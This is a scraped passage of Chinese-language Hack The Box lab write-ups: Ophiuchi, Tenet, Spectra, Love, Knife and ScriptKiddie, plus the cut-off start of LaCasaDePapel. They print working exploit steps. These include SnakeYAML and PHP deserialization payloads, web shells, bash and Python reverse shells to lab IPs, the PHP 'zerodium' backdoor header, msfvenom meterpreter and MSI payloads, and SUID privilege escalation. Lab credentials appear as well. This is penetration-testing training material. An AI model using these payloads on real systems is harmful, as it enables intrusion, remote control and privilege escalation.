https://github.com/LucifielHack/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java 将该代码保存为exploit.java 然后使用javac进行编译，即可得到.class文件 我们将snakeyaml.exploit写入到javax.script.ScriptEngineFactory中 然后我们新建一个文件夹 snakeyaml，然后将文件结构这样放 然后我们在Ophiuchi目录下使用python3开启一个http服务器 然后在YAML中属于我们第一次调用的poc来进行调用 成功 然后我们在Ophiuchi目录中创建一个exploit.sh脚本 这个脚本是用来反弹shell用的 然后我们本地使用nc开启一个监听端口 nc -nvlp 4444 然后，我们将wget将刚才写的bash脚本下载并保存到&#x2F;tmp目录中，然后使用bash执行它，现在我们休要修改我们的exploit.java文件 然后重新编译exploit.java文件 在YAML中继续执行我们刚才的代码 成功获取到shell，并且使用python3获得一个稳定的shell python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; PS：如果这里没有获取到，那应该是java的版本不对，新版本java不行，必须得使用java class 55版本进行编译 代码 javac –release 11 exploit.java 然后我们我们知道，该web服务器是使用apache tomcat进行搭建运行的，所以我们现在去查看tomcat的配置文件 使用find命令进行查找 find / -name &quot;tomcat-users.xml&quot; 2&gt;/dev/null 找到了，然后使用cat查看即可 得到了账号密码 username = admin password = whythereisalimit 我们查看一下这台机器的账户 我们可以看到，这台linux的机器上，admin居然是一个账户，而且权限还不低？出题人扣十分 记大过一次 咱们直接使用su进行登录或使用ssh进行登录即可 成功拿到user权限的flag 权限提升使用sudo -l查看咱们的sudo权限 咱们发现，可以直接使用root权限执行&#x2F;opt&#x2F;wasm-functions&#x2F;index.go文件，那提权的突破口肯定在这了，咱们查看一下吧 进行代码审计，咱们可以看到。它会读取Web程序集二进制文件，然后它会从info函数中获取一个值，如果该值不等于1，程序将会输出“Not ready to deploy”，不然将会执行一个deploy.sh脚本 有一点需要注意， main.wasm 和 deploy.sh 在源代码中没有绝对路径，这意味着我们可以创建自己的文件，然后使用 PATH 变量。 所以首先我要下载 main.wasm 到我的机器上 在目标机器目录&#x2F;opt&#x2F;wasm-functions目录中使用Python3开启一个服务器 然后使用wget下载 https://github.com/LucifielHack/wabt 这里使用一个名为wabt(Web Assembly Binary Toolkit)的工具，我们需要将main.wasm文件转换为.wat文件，因为它是该二进制文件的文本格式。但在此之前首先让我们使用wasm-decompile查看二进制文件中的info函数，它将二进制文件反编译为C语言的格式 ./wabt/build/wasm-decompile main.wasm -o main.dcmp 我们可以看到该info函数返回值0，这就是我们要修改的内容了 将.wasm转换为.wat文件 ./wabt/build/wasm2wat main.wasm -o main.wat 然后打开main.wat文件 我们可以看到const值为0 我们将它改为1 现在我们需要修改回二进制形式(.wasm) 因此我们需要将.wat转换为.wasm ./wabt/build/wat2wasm main.wat -o main.wasm 将main.wasm上传到&#x2F;tmp目录 咱们制作一个deploy.sh文件在&#x2F;tmp目录 现在添加&#x2F;tmp到PATH变量并以sudo的形式运行golang源代码 export PATH=/tmp:$PATH echo $PATH 大家可以看到，已经运行成功了，直接使用bash -p进行提权即可 提权成功 成功获得root权限的flag 收工睡觉","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Tenet - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Tenet","date":"2021-05-31T11:38:36.000Z","updated":"2023-06-13T03:53:35.000Z","comments":true,"path":"2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/","link":"","permalink":"http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/","excerpt":"","text":"Hackthebox - TenetHackthebox - Tenet 靶场实战 靶场信息 靶场类型 信息搜集 首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.223 我们可以看到，本台靶场开启了22和80端口，咱们访问80端口看看 访问80端口后发现是一个apache2的默认页面，那就可以确定是apache的漏洞入手了 简单查看了一下，没有其他啥东西，咱们先爆个目录吧 懒得使用鼠标了，所以这里咱们使用gobuster进行爆破 gobuster dir -u http://10.10.10.223 -x php,log,txt -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt –wildcard -o gob 找到了一个文件一个目录 &#x2F;users.txt &#x2F;wordpress 咱们先看看&#x2F;users.txt文件 得到了一个用户名Success，先记录下来，咱们去看看wp 嘛玩意儿？你告我这是wordpress？我都准备好砸exp了结果你告诉我这？ 翻了一下网页源代码，在css里发现了一个域名tenet.htb，成吧，还是得去&#x2F;etc&#x2F;hosts里添加一个解析。 vim &#x2F;etc&#x2F;hosts 添加后再访问就对劲了 这里发现有一些文章，但是我这小学英语都不及格的水平…没办法，开翻译器吧 然后我们在其中一篇《Migration》上，找到了一条评论 经过机翻+我个人的理解后，大致意思如下： 你是否删除了sator.php的备份文件？迁移文件不完整，你为啥要这样做？你图啥？（最后一句我自己加的，文里没有） 整理一下目前我们得到的信息 两个用户，分别为neil和管理员protagonist（猜测，证据如下图） 和一个php文件 sator.php 思路整理，用户neil质问管理员为什么在迁移web程序的时候删除了sator.php从而导致了网站文件不完整，也就是说wordpress目录下是不可能存在这个文件的。但是咱们又要利用到这个文件，那在一开始的apache2目录下尝试一下？ 似乎没有什么有用的信息，我又回去看了一下neil用户的评论。 等等？备份文件？那意思就是bak文件？咱们尝试一下 我可真是太棒了，现在是凌晨四点，奖励自己一顿烧烤，长胖了都是你们的责任，记得背锅 成功搞到一份php源码，审计吧。 但是吧，审计确实是我的短板，所以怎么办呢？这个时候丢给“朋友”就好了，老白嫖了 原理讲解 我们可以在这里看到，有一个类 DatabaseExport，其中有两个公共变量 user_file、data 并且在这个类中，有一个公共函数被调用 update_db()，该函数将 data 变量设置为“Success”，这只是一个txt文件，正如你从 sator.php 中看到的那样，最后的网络浏览器有一个magic函数（这个找资料的时候看到的，但我不知道怎么翻译）__destruct()，当一个对象被销毁时，它会自动调用 user_file 将使用来自 data 的内容并将其放入web目录中，这意味着在web目录中创建 users.txt 数据“Success”。 最后我们可以 GET 参数 arepo，现在这里存在一个漏洞，称为“PHP反序列化” 因此，要利用这一点，我们必须修改在这种情况下，类变量 user_file，并将 data 序列化，一旦我们得到了序列化字符串，我们把它传递给 arepo 参数中。 漏洞利用 虽然我代码审计很弱，但我大概看懂了，它生成了一个名为users.txt的文件，内容为Success，那咱们让他生成php文件然后写入一句话木马，这不就成了？ 这不就是妥妥的php反序列化吗？ 代码 ‘; } $test &#x3D; serialize(new DatabaseExport); echo $test; ?&gt; 将上面的代码保存为php文件，然后执行后会得到一个php序列化 然后我们需要以url编码的形式把它传递给 GET 参数，所以我们使用cyberchef（或其他工具）来完成 https://gchq.github.io/CyberChef/#recipe=URL_Encode(false) O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D 咱们通过 GET 传输，直接粘贴到url里 http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D 提示已经更新了，那就是成功了 成功执行命令，我们拿到了一个webshell 熟悉我的读者们都知道，我比较喜欢利用python3 所以咱们直接看看是否存在python3 哦豁 存在python3，这是一件很幸运的事情 咱们直接用python3进行反弹shell 本地监听4444端口 http://10.10.10.223/shell.php?cmd=python3 -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.184”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’ 成功得到了一个稳定的shell，芜湖，起飞 由于我们现在只是www-data用户，权限低的很，现在还得先获取到一个正常的用户 咱们检查一下cron的工作 检查一下开放的端口 已经有思路了啊兄弟们 我们可以看到3306端口在我们本地运行着，那多半就是mysql了，咱们直接找mysql的配置文件啊 我记得我以前打过很多wordpress的站（抱歉，都是涉密项目，所以不方便写成文章），在wp-config.php文件里，一般会有数据库的账号密码的，咱们去读取试试 成功拿到 DB_NAME &#x3D; wordprss DB_USER &#x3D; neil DB_PASSWORD &#x3D; Opera2112 登陆失败？那这暗示就很明显了，应该是一个用户了，咱们看看去， 等会儿？我以为这是一个数据库用户，没想到权限还挺大？ 咱们直接登录吧 登录成功 成功拿到user权限的flag 权限提升 咱们老规矩，sudo -l查看一下sudo权限 发现可以直接用root权限执行enableSSH.sh文件，那提权还不简单？在根目录下本来就存在一个exp.sh，这不提示就来了？咱们查看一下 我怎么看着有点不对劲呢。。。 在迟疑了大概1.25秒后，我悟了！ 这TM是其他哥们儿做过后留下的提权脚本！这根本就不是我要的东西！ 我丢啊，稍等各位，我先重置一下靶场，再来一次 cat &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh 查看这个sh文件才对，刚才搞错了，请大家无视哈 这些内容都比较无聊，咱们直接拉到最底下 我们可以看到一个addkey()使用命令创建临时文件的函数mktemp 如果我们在本地机器上运行此命令查看它生成的文件名，我们可以看到每次运行此命令时，文件名都是不一样的 mktemp -u &#x2F;temp&#x2F;ssh-XXXXXX 摸了摸我并不存在的头发，这玩意儿真让人头秃 公共密钥获取方法 ssh-keygen 然后根据我们自己的情况进行设置，然后文件保存在&#x2F;root&#x2F;.ssh&#x2F;id-rsa.pub中 将如下代码保存到exp.sh文件 while true do echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoVUNa8uk2pi8tECc1c6SsFbq1xlNvnhwzqgEjmN6yyp8u7TIC4VbzgyRC2UnN9dM0wn9mP103gIAxLGXxgy5kl+cquFffZPoOjfd9I4ZLFDHaPr6eXbXSCg445UXG1gAj8b7lPGemz6vApGrlMGjl1TABKMBHCTbzqSVoAxaDZXSiF4kIKKU4b2Dx8Uw7XgTdd+KWZnuIozuYyZlD3+cl&#x2F;&#x2F;inLetupgpP0ZBvcBqAr1UqtCxsMx2Yzy3XfQ&#x2F;VQMW4Qeswuvx98P+kP6wqpq2jXxaEoRkyVcIlQekJg1W+XwuuNixQeli7CQQBgqu7FwUYrftlWZm0br3HNQlVwBgB+zqExOmt8iktcHjw3pLetwI7X7sdB5pUS4QN2hwDDQsAuhaGMt4MAWSLKsgEZJxWT4FTH2R5+eTCXZNbH97aGbH0&#x2F;ONmzZFKm9bOwvnflQ5taIe149JbuPMc6sba5C4FROHagprucjaPDYhp&#x2F;v0q0ztKq2G9Ay5yfCTTFj5sYuk&#x3D; root@root’ |tee &#x2F;tmp&#x2F;ssh-* done 添加运行权限 chmod +x exp.sh 然后运行.&#x2F;exp.sh 然后咱们再开一个ssh连接 然后咱们在新开的ssh连接上运行’ sudo &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh’几次 然后咱们测试一下是否可以连接 ssh root@10.10.10.223 -i id_rsa 如果不行，咱们就再来一次即可 成功拿到root权限的flag 正好这个时候我点的烧烤也到了，吃夜宵去","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Spectra - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Spectra","date":"2021-05-28T11:38:36.000Z","updated":"2023-06-13T03:52:43.000Z","comments":true,"path":"2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/","link":"","permalink":"http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/","excerpt":"","text":"Hackthebox - Spectra靶场信息 靶场类型 信息搜集 使用nmap进行基本的端口扫描 nmap –A -sS -sC -sV 10.10.10.229 我们发现开启了22、80和3306端口 咱们访问80端口看一下 内容非常简单，咱们看一下源代码 发现会跳转到域名spectra.htb 咱们在hosts里添加该域名 vim &#x2F;etc&#x2F;hosts 10.10.10.229 spectra.htb www.spectra.htb 然后咱们访问一下试试 咱们可以看到这是一个wordpress的站点 到处点了一下似乎没有可用的东西，咱们看看另一个连接 建立数据连接错误，既然提示这个，又开启了3306端口，那么后面估计是一定会用到的，咱们先记录一下，后面很有可能会用到，然后把眼光放回第一个页面 咱们目前思路卡壳了，不知道做什么了，那就扫描一下目录吧，我这里使用dirbuster工具进行目录爆破吧 导入后按start启动扫描 扫描的同时我也在挨个看，发现&#x2F;testing&#x2F;目录下存在目录遍历漏洞，咱们进入看看 进来后发现又一些php文件，看文件名似乎还有配置文件，咱们挨个查看一下 在一圈文件查看下来后都没有看到什么有用的信息，但在文件wp-config.php.save的时候，点进去却是空白页面，但文件大小处却又明确显示是有内容的，这一点引起了我的注意 咱们看一下网页源代码 咱们居然在这找到了数据库的账号密码，看来运气还是不错的 db_name &#x3D; dev db_user &#x3D; devtest db_password &#x3D; devteam01 漏洞利用 这里既然拿到了数据库账号密码，又开启了3306端口，咱们自然是尝试进行登录了 mysql –host 10.10.10.229 –user devtest –password devteam01 -D dev 但是这里却显示登录失败？不允许连接到这个数据库 嗯。。。看来果然没我想的那么简单啊，那么现在唯一用得到账号密码的，就只有wordpress了，咱们只能从这里继续入手了 http://spectra.htb/main/wp-login.php 咱们进行登录 直接使用之前获取到的数据库账号devtest进行登录却提示没有这个账号 看来果然没有我想的那么简单，我大意了，没有闪 好在这个时候，突然灵感从天而降，发现主页有一篇文章，最经典的一句“hello world”，but 咱们的重点不在这里，而是在发帖人，administrator 好家伙，这不就有用户名了嘛？而且同时咱们nmap没有识别出操作系统，看到这个就可以怀疑是windows了 咱们使用账户administrator 密码devteam01进行登录，成功进入后台 并且获取到wordpress的版本为5.4.2 拿到版本了，就可以使用已知漏洞进行攻击了 咱们这里有三种办法获得shell 第一种： 使用msf进行负载攻击 use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_admin_shell_upload set USERNAME administrator set PASSWORD devteam01 set TARGETURI &#x2F;main set rhosts 10.10.10.229 set lhost 10.10.14.135 exploit nice 成功获取到一个shell 第二种： 修改404页面进行反弹shell 首先本地使用nc监听一个端口 nc -nvlp 5555 然后咱们登入到网站后台 修改404页面的源码 咱们插入恶意代码 下载地址 http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz 其中需要修改的内容 set_time_limit (0); $VERSION &#x3D; “1.0”; $ip &#x3D; ‘10.10.14.135’; &#x2F;&#x2F; CHANGE THIS $port &#x3D; 5555; &#x2F;&#x2F; CHANGE THIS $chunk_size &#x3D; 1400; $write_a &#x3D; null; $error_a &#x3D; null; $shell &#x3D; ‘uname -a; w; id; &#x2F;bin&#x2F;sh -i’; $daemon &#x3D; 0; $debug &#x3D; 0; 然后点击保存 啊这，好像失败了，诸位等我稍稍研究一下 好了，经过测试，咱们将模板设置为Twenty Sevente就可以保存了 然后咱们访问404页面 http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php 成功反弹回shell 第三种： 第三种就是利用插件上传的漏洞，然后使用msf来进行shell的接收，这个步骤咱们不如直接第一步了，有点多此一举，有兴趣的朋友可以自己进行研究 exploit地址 https://www.exploit-db.com/exploits/36374 msf设置 use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_slideshowgallery_upload set rhosts 192.168.1.101 set targeturi &#x2F;wordpress exploit exec（“ &#x2F; bin &#x2F; bash -c’bash -i&gt;＆&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;＆1’”） 参考连接 https://www.hackingarticles.in/wordpress-reverse-shell/ 权限提升 咱们首先使用python3获取一个更加稳定的shell python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’ 我们在翻找文件的时候，在opt目录下发现了一个autologin.conf.orig文件 cat查看后，发现是有个自动登录的脚本，指向了&#x2F;etc&#x2F;autologin 咱们过去看看 发现了一个passwd文件，咱们cat查看 得到了一个密码 SummerHereWeCome!! 经过测试并结合咱们找flag以及翻目录的时候得到的消息来看，似乎是用户katie的 正好开启了22端口，咱们使用ssh进行登录 ssh &#107;&#x61;&#116;&#x69;&#x65;&#64;&#49;&#x30;&#46;&#x31;&#48;&#46;&#49;&#48;&#x2e;&#50;&#x32;&#x39; 成功登录 成功获得user权限的flag 使用sudo -l查看一下咱们的sudo权限 发现咱们可以执行&#x2F;sbin&#x2F;initctl 这个权限是查看咱们可编辑的服务 sudo initctl list 可编辑的服务挺多的，我就不全部截图了，然后咱们进行筛选查看 咱们在最后面看到一个名为test2的未运行且可编辑的服务，叫这个名字那就肯定不一般了，咱们look look，所有的服务都在&#x2F;etc&#x2F;init目录下 这么多test的服务，咱们就从test.conf开始look吧 cat &#x2F;etc&#x2F;init&#x2F;test.conf 嗯。。。在这里正在运行一个nodejs的文件 nodetest.js 咱们也去look look cat &#x2F;srv&#x2F;nodetest.js 咱们将恶意代码替换到test.conf里，然后执行进行提权吧，其实也可以更改nodetest.js的文件进行nc反弹并提权，但是好麻烦啊，我就给各位一个图，大家有兴趣的自己研究吧，我使用第二种办法，直接修改test.conf的内容吧 第一种： 第二种： nano &#x2F;etc&#x2F;init&#x2F;test.conf 执行如下命令即可提权 sudo &#x2F;sbin&#x2F;initctl start test 使用sudo权限启动test服务 ls -l &#x2F;bin&#x2F;bash 查看&#x2F;bin&#x2F;bash即可发现我们的SUID已经传递给root用户 &#x2F;bin&#x2F;bash -p 提权 提权成功 成功获得root权限的flag 完事儿收工睡觉","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Love - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Love","date":"2021-05-26T11:38:36.000Z","updated":"2023-06-13T03:46:30.000Z","comments":true,"path":"2021/05/26/Hackthebox/Easy/Hackthebox-Love/","link":"","permalink":"http://www.lucifiel.com/2021/05/26/Hackthebox/Easy/Hackthebox-Love/","excerpt":"","text":"Hackthebox - Love靶场信息 靶场类型 信息搜集Nmap首先使用nmap进行基本的端口探测 Nmap -A -sS -sV -sC 10.10.10.239 Nmap探测到开启了80、135、139、443、445、3306、5000、5040、5985、5986、47001、49664-49670之间的端口，其中80和443还有5000为web服务 Nmap探测发现 443端口的ssl证书上提示了两个域名， 分别为love.htb以及staging.love.htb 我们通过修改hosts文件指定这两个域名解析的IP为靶场的IP 10.10.10.239 Vim /etc/hosts Http我们访问5000端口看看有什么东西 提示我们没有访问的权限，那就先不管这个，我们去看看80端口 80端口有一个登录框 通过搜索voting system系统发现是存在注入的 漏洞参考地址 https://www.exploit-db.com/exploits/49817 https://www.exploit-db.com/exploits/49846 我们抓个包来注入一波 将抓到的数据包保存在本地，使用sqlmap进行注入 没有注入出来，我们放弃这个思路，来看看第二个域名 漏洞利用 http://staging.love.htb/ 进入该页面后，有两个可点击的按钮，分别是Home和Demo Home是一个登陆口，或许有注入，但先看看其他功能 点击Demo，进入这个页面 似乎是一个扫描器，咱们随便扫描一个页面试试 随便扫描了一个页面，没有什么反应，思路到这里就卡壳了呀。 在打了一把LOL被队友坑了后，突然来了思路 我们不是有一个无权限访问的5000端口吗，那让它自己发出访问请求，是否就有权限了？说干就干 弹出了如下页面 这时候我们就拿到密码了账号和密码 账号admin 密码@LoveIsInTheAir!!!! 然后我们去登录 提示找不到这个ID？这不对劲啊兄弟 咱们去找一下这个cms 经过搜索后，找到了该cms的源码 您猜怎么着？还真让我找到了哎嘿 https://www.sourcecodester.com/php/12306/voting-system-using-php.html 这是咱们找到的cms源码 其中看到了一个使用教程 根据提示，后台登录页面在&#x2F;admin&#x2F;下，这个index.php就是用来迷惑咱们的，我直接好家伙 咱们访问&#x2F;admin&#x2F;目录进行登录 我直接好家伙，咱们用账号密码进行登录 总算是排除万难进入后台了 这里咱们使用Voters来进行getshell 创建一个新选民 在photo处传入我们的shell或是一句话木马，进入 http://love.htb/images 查看我们的shell是否上传上去 可以看到，我们的shell已经上传上去了，咱们进入shell OK 咱们成功获得了一个交互式shell，但毕竟不是一个稳定的shell，咱们接下来想办法获得一个稳定的shell，并且因为某些脚本的原因，我们上传的webshell可能会被删除 咱们使用msfvenom生成一个exe的木马 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.135 LPORT=4444 -f exe &gt; shell.exe 使用msfconsole进行监听 use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.10.14.135 set LPORT 4444 exploit 然后我们本地使用python3开启一个http服务 python3 -m http.server 80 然后在shell里使用curl进行下载 Curl [http://10.10.14.135/shell.exe -o shell.exe](http://10.10.14.135/shell.exe%20-o%20shell.exe) OK，成功下载下来了，咱们直接运行该木马 运行后成功弹回了shell 我们成功获得第一个flag 权限提升找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。 我们查看一下alwaysinstallelevated的设置 reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer 结果均为0x1，也就是存在该漏洞 使用msfvenom生成一个msi马 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.135 LPORT=5555 -f msi &gt; shell.msi 再单独开一个msfconsole进行监听 use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.10.14.135 set LPORT 5555 exploit 然后上传我们的msi马 成功上传 然后在之前获取的shell中输入指令shell即可进入shell（绕口令？） 使用msiexec &#x2F;quiet &#x2F;qn &#x2F;i shell.msi运行msi马 /quiet = Suppress any messages to the user during installation /qn = No GUI /i = Regular (vs. administrative) installation 提权成功 成功获取到管理员权限的shell","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Knife - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Knife","date":"2021-05-24T11:38:36.000Z","updated":"2023-06-13T03:45:47.000Z","comments":true,"path":"2021/05/24/Hackthebox/Easy/Hackthebox-Knife/","link":"","permalink":"http://www.lucifiel.com/2021/05/24/Hackthebox/Easy/Hackthebox-Knife/","excerpt":"","text":"Hackthebox - Knife靶场信息 靶场类型 信息搜集Nmap首先使用nmap进行端口扫描 我们得知开启了22和80端口 出于能不爆破就不爆破的原则，先访问80端口看一下 Http 80端口上的内容有点不明所以。 在完全没思路的情况下，尝试使用dirbuster工具进行了目录爆破，但四十分钟过去了却没有一丁点收获，连robots.txt页面也不存在。 我的思路就卡在这里了，一时之间不知道应该怎么做，就去泡了杯茶，突然来了灵感，要不先抓个包看看？ 乍一看似乎没有什么值得关注的东西，但在通宵日靶场导致神志不清又经过了茶叶洗礼的脑瓜子的引导下，我注意到了一个点。 X-Powered-By: PHP/8.1.0-dev 这东西，隐约之间觉得不简单，便去百度进行了搜索。搜索的同时尝试了nikto工具，也提示了这一条 就是这两个提示，让我确信突破口在这，然后经过大量的google和百度搜索后，找到了一丝思路。 PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。 漏洞利用 使用burp抓包，并加入字段 User-Agentt: zerodiumvar_dump(2*3); 发现被成功执行 接着尝试命令是否可被解析执行 User-Agentt: zerodiumsystem(&quot;id&quot;); Nice 命令可被执行，那就简单了，可以执行命令，那就尝试getshell吧 本地监听： Nc –nvlp 9001 执行命令： User-Agentt: zerodiumsystem(&quot;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.240/9001 0&gt;&amp;1&#39;&quot;); 成功通过nc获得了一个shell 首先确定是否有python Which python3 确定python3存在，使用python3获得一个交互式 shell 程序 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 成功获得普通用户的flag 权限提升先确定knife用户的sudo权限 Sudo –l Ls –al /usr/bin/knife 进行提权 echo &quot;system(&#39;chmod +s /bin/bash&#39;)&quot; &gt; exploit.rb ls sudo /usr/bin/knife exec exploit.rb ls -al /bin/bash /bin/bash –p 获得root用户的flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"ScriptKiddie - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-ScriptKiddie","date":"2021-05-24T11:38:36.000Z","updated":"2023-06-13T03:50:05.000Z","comments":true,"path":"2021/05/24/Hackthebox/Easy/Hackthebox-ScriptKiddie/","link":"","permalink":"http://www.lucifiel.com/2021/05/24/Hackthebox/Easy/Hackthebox-ScriptKiddie/","excerpt":"","text":"Hackthebox - ScriptKiddieHackthebox-ScriptKiddie靶场实战 靶场信息 靶场类型 信息搜集 先使用nmap进行最基本的端口扫描 nmap -A -sS -sV -sC 10.10.10.226 发现开启了22端口和5000端口，再次基于能不爆破就不爆破的原则，我们直接看5000端口 5000端口上运行了Werkzeug，通过google搜索发现Werkzeug存在Werkzeg debug shell漏洞，但对比了下版本不适用，那就只能先访问5000端口看看具体情况了 这是一个继承了nmap、msfvenom、searchsploit工具的一个小黑客工具？那就先尝试一下他的工具吧。使用nmap扫描一下本地端口 我们获得的信息有nmap版本为7.80 尝试搜索漏洞 通过google和exploit-db均未发现可getshell的漏洞，放弃该思路 漏洞利用 我们把目光放到第二个工具msfvenom上 搜索venom发现了一个APK模板命令注入漏洞 将exploit-db上的exp给下载下来并进行修改 然后执行该EXP 获得了evil.apk文件，在本地监听443端口后将该文件上传 能弹回来，但shell似乎有问题，我们直接使用msf来生成，免去麻烦 首先运行msf然后 use exploit&#x2F;unix&#x2F;fileformat&#x2F;metasploit_msfvenom_apk_template_cmd_injection来载入exp 设置好ip和端口后输入exploit执行 获得脚本&#x2F;root&#x2F;.msf4&#x2F;local&#x2F;msf.apk 然后本地使用nc监听4444端口 Nc –nvlp 4444 使用5000端口上的第二个脚本进行上传 成功反弹回一个shell，我们执行以下命令获得一个稳定的shell SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null 在根目录下我们成功取得普通用户的flag 权限提升 进入home目录，发现除了我们使用的kid用户以外，还有一个pwn用户 进入目录并查看文件 发现有一个scanlosers.sh脚本 我们查看一下脚本内容 该脚本会一直扫描&#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackers的目录文件的IP地址 该脚本未对hackers文件传入的内容做过滤，并且我们使用的kid用户也有对该文件的编辑权限，我们直接写入一个命令执行，来让他把pwn用户的权限反弹给我们 我们本地监听一个新的端口5555 Nc –nvlp 5555 先切换到logs目录 Cd logs 然后写入恶意代码 echo “ ;&#x2F;bin&#x2F;bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.135&#x2F;5555 0&gt;&amp;1’ #” &gt;&gt; hackers 直接使用echo输入，或是手动编辑均可，只要能把命令写入进去即可 写入成功，并成功反弹回pwn用户的shell 使用sudo -l检查一下pwn用户的权限 发现pwn用户拥有msf的权限，且不需要root密码，直接进入msf调用root权限 sudo &#x2F;opt&#x2F;metasploit-framework-6.0.9&#x2F;msfconsole 成功使用root权限进入msf，此时咱们已经拥有root权限，直接进入root目录拿root用户的flag即可 成功拿下root权限的flag 收工睡觉","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"LaCasaDePapel - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-LaCasaDePapel","date":"2019-03-30T11:38:36.000Z","updated":"2023-06-17T02:16:29.000Z","comments":true,"path":"2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/","link":"","permalink":"http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/","excerpt":"","text":"Hackthebox - LaCasaDePapel靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:07 CST Nmap scan report for 10.10.10.131 Host is up (0.51s latency). Not shown: 65530 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA) | 256 41e495a3390b25f9dadebe6adc59486d (ECDSA) |_ 256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519) 80/tcp open http Node.js (Express middleware) |_http-title: La Casa De Papel 443/tcp open ssl/http Node.js Express framework | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel | Not valid before: 2019-01-27T08:35:30 |_Not valid after: 2029-01-24T08:35:30 | tls-nextprotoneg: | http/1.1 |_ http/1.0 |_ssl-date: TLS randomness does not represent time 6200/tcp filtered lm-x No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=1/9%OT=21%CT=1%CU=43703%PV=Y%DS=2%DC=T%G=Y%TM=63BB22C2 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O OS:1=M537ST11NW6%O2=M537ST11NW6%O3=M537NNT11NW6%O4=M537ST11NW6%O5=M537ST11N OS:W6%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R OS:=Y%DF=Y%T=40%W=7210%O=M537NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS% 